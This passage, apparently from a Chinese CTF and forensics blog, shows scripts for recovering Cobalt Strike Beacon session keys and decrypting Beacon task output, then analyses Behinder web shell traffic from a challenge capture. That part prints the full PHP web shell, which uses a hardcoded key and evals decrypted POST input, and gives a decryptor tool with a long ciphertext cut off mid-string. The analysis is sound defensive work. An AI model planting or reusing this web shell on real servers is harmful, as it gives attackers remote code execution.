= privateKey.n.bit_length() // <span class="number">8</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="keyword">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">private_decrypt</span>(<span class="params">cipher_text, privateKey</span>):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_AES_HMAC_Key</span>(<span class="params">SerializeKeyPath, rsa_cipher_text</span>):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;xeoOUNy9EhFV01fTyqDHJTvrnfCji6iHiLabfNhxoLKdY6xA8HV8g8fmvrgs6J4d3MjdhG9ww/CAj6tEFj3Y1hfcODoOz+ggqc5jb7lcGuEHmuN7j0NawY8t5Ro7vbnDJmGF9a7Zve3v3cYHEZexDjTgfl+119fyM6hWOuXd5LM=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES key: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HMAC key: <span class="subst">&#123;hmac_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cs.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES key:5f277b49bb4b15cc0728835639d691fc</span><br><span class="line">HMAC key:8c67ccf3324dae539604a6e019a57664</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Beacon任务执行结果解密</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_mac</span>(<span class="params">mac, mac_verif</span>):</span><br><span class="line">	<span class="keyword">if</span> mac == mac_verif:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="built_in">len</span>(mac_verif):</span><br><span class="line">		<span class="built_in">print</span></span><br><span class="line">		<span class="string">&quot;invalid MAC size&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(mac, mac_verif):</span><br><span class="line">		result |= x ^ y</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[<span class="number">0</span>:<span class="number">16</span>], signature):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">	data = cypher.decrypt(encrypted_data)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#key源自Beacon_metadata_RSA_Decrypt.py</span></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;5f277b49bb4b15cc0728835639d691fc&quot;</span>)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;8c67ccf3324dae539604a6e019a57664&quot;</span>)</span><br><span class="line"><span class="comment"># 密文 原始数据 hex 解码 base64加密</span></span><br><span class="line"></span><br><span class="line">encrypt_data=<span class="string">&quot;AAAAUJwE+4Qyg3PGsdV+8stF4umcLlO5zBdLb0WRnKAT9cEjsKqM7DiRiWBGBMpksTmEVk+s+DJY+obKpkiG3j0COF04qLaB8INl6IaF+kqCeauM&quot;</span></span><br><span class="line"></span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span class="line">encrypt_data_length=encrypt_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=<span class="built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:<span class="built_in">len</span>(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[<span class="number">0</span>:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="built_in">bytes</span>(<span class="string">&quot;abcdefghijklmnop&quot;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = dec[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">counter=<span class="built_in">int</span>.from_bytes(counter, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">dec_length=<span class="built_in">int</span>.from_bytes(dec_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[<span class="number">8</span>:<span class="built_in">len</span>(dec)]</span><br><span class="line">Task_type=de_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">Task_type=<span class="built_in">int</span>.from_bytes(Task_type, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Task_type))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(de_data[<span class="number">4</span>:dec_length].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))    <span class="comment"># 第69行</span></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>

<h1 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h1><p>流量特征</p>
<p>Easy_Shark<br><a href="https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip">https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip</a></p>
<p>追踪http 流 发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;2295d22e2d70888f&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&quot;2295d22e2d70888f&quot;;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">getopt</span>(<span class="string">&#x27;a:k:f:t:d:&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进入php文件\n\n\n\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>])?<span class="variable">$key</span>=<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>]:<span class="variable">$key</span>=<span class="string">&#x27;e45e329feb5d925b&#x27;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>])?<span class="variable">$http_type</span>=<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>]:<span class="variable">$http_type</span>=<span class="string">&#x27;requests&#x27;</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span></span><br><span class="line"><span class="comment">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$post_raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$post_raw</span>= <span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// preg_match(&#x27;//&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$post_raw</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="comment">// echo &quot;\$post is :&quot;.$post[0];</span></span><br><span class="line">    <span class="comment">// echo &quot;aes的数据为：&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoaes函数：&quot;.$post[0];</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>[<span class="number">0</span>], <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">//日志方法，具体自己实现</span></span><br><span class="line">        <span class="comment">// CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE)); </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_type</span> == <span class="string">&#x27;requests&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span></span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post_raw</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$post_raw</span> = <span class="variable">$post</span>;</span><br><span class="line">        <span class="comment">// echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;thisresponse&quot;;</span></span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$post_raw</span>;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">// echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span></span><br><span class="line">        <span class="comment">// var_dump(strpos($post,$pattern));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>)+<span class="title function_ invoke__">strlen</span>(<span class="variable">$pattern</span>)+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$post</span> = <span class="variable">$result</span>;</span><br><span class="line">                <span class="comment">// echo &quot;intotheconvert&quot;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span></span><br><span class="line">    <span class="comment">// echo &quot;this is \$post:&quot;.$post;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">aes_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span></span><br><span class="line"><span class="variable">$post</span> === <span class="string">&#x27;no&#x27;</span>?<span class="variable">$post</span> = <span class="title function_ invoke__">xor_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span>):<span class="variable">$post</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$post&quot;.$post;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\&#123;/i&#x27;</span>,<span class="variable">$post</span>))&#123;</span><br><span class="line">    <span class="comment">// echo $post;</span></span><br><span class="line">    <span class="comment">// exit();</span></span><br><span class="line">    <span class="comment">// echo &quot;error is &quot;.$post;</span></span><br><span class="line">    <span class="variable">$raw_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$raw_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 捕获异常</span></span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$arr_2</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr_2</span>[<span class="number">1</span>])?<span class="variable">$parm</span>=<span class="variable">$arr_2</span>[<span class="number">1</span>]:<span class="variable">$parm</span>=<span class="variable">$func</span>;      <span class="comment"># 解决tcp请求包截取不完整导致aes解密后没有</span></span><br><span class="line"><span class="comment">// print(&quot;intotheexplode:&quot;.$parm);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$parm</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$parm</span>=<span class="string">&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;</span>;       <span class="comment"># 解决 http截取的tcp包不完整的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$parm</span>,<span class="variable">$last_result</span>);</span><br><span class="line"><span class="comment">// echo &quot;匹配到的内容为&quot;.$result[0];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$last_result</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$last_result</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$parm</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -a 后面接要解密的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -f 解密的字符串的文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此处的密文字符串文件只允许存在密文，不允许有http请求体。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 秘钥 -a 解密字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>默认的key值为冰蝎默认密码。</p>
</blockquote>
<p>tcp 流5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a 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